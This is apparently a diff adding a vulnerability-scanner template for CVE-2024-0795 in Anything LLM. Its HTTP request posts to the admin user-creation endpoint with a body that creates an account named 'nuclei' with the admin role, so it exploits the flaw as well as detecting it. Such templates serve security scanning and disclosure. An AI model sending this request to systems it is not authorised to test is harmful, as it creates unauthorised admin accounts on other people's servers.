@@ -1,0 +1,40 @@
+id: anything-llm-admin-creation-bypass
+
+info:
+  name: Anything LLM Unauthorized Admin Account Creation
+  author: raltheo2, byt3bl33d3r
+  severity: high
+  description: Unauthorized creation of an admin account in Anything LLM due to lack of server-side validation for user roles.
+  reference:
+    - https://huntr.com/bounties/f69e3307-7b44-4776-ac60-2990990723ec/
+  classification:
+    cvss-score: 7.2
+    cve-id: CVE-2024-0795
+    cwe-id: CWE-284
+  tags: anything-llm,admin,account,creation,bypass,cve,huntr,protectai
+
+# Update these accordingly
+variables:
+  token: ""
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/admin/users/new"
+    headers:
+      Authorization: "Bearer {{token}}"
+      Content-Type: "application/json"
+    body: |
+      {
+        "username": "nuclei",
+        "password": "nuclei1234",
+        "role": "admin"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
